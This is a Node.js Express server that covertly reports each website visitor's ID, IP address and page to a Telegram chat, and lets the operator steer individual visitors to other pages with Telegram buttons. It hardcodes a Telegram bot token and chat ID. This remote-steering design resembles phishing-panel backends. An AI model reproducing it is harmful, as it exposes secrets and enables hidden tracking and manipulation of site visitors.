const express = require("express");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "frontend"))); // dossier frontend

// Variables d'environnement (mettre dans Render)
const BOT_TOKEN = process.env.BOT_TOKEN || "8208574276:AAF96EdGjUrQqkRrb31QjzqVJ9uMB5c";
const CHAT_ID = process.env.CHAT_ID || "7747778364";
const BASE_URL = process.env.BASE_URL || "https://basketnew.onrender.com";

let userCommands = {}; // stocke la commande Telegram pour chaque visiteur

// Fonction pour envoyer un message Telegram
async function sendTelegramMessage(text, keyboard) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
    });
  } catch (err) {
    console.error("Erreur Telegram:", err);
  }
}

// Route pour recevoir chaque visite
app.post("/visit", async (req, res) => {
  const { visitorId, page } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const keyboard = {
    inline_keyboard: [[
      { text: "🏠 Accueil", callback_data: `index_${visitorId}` },
      { text: "ℹ️ Info", callback_data: `info_${visitorId}` },
      { text: "📞 Contact", callback_data: `contact_${visitorId}` },
      { text: "👀 Visite", callback_data: `visite_${visitorId}` }
    ]]
  };

  const message = `👤 <b>Nouveau visiteur</b>\n🆔 ID: ${visitorId}\n🌍 IP: ${ip}\n📄 Page: ${page}`;
  await sendTelegramMessage(message, keyboard);

  res.json({ success: true });
});

// Route pour récupérer la commande Telegram
app.get("/get-command", (req, res) => {
  const { visitorId } = req.query;
  const command = userCommands[visitorId] || null;
  if (command) delete userCommands[visitorId];
  res.json({ command });
});

// Route pour gérer les callbacks Telegram
app.post("/webhook", async (req, res) => {
  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [page, visitorId] = cb.data.split("_");
  userCommands[visitorId] = page;

  // Réponse immédiate au callback
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id: cb.id, text: `➡️ Page: ${page}` }),
  });

  res.sendStatus(200);
});

// Serveur
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`✅ Serveur actif sur le port ${PORT}`);

  // Configurer le webhook Telegram
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${BASE_URL}/webhook`);
    console.log("📡 Webhook Telegram configuré !");
  } catch (err) {
    console.error("Erreur configuration webhook:", err);
  }
});
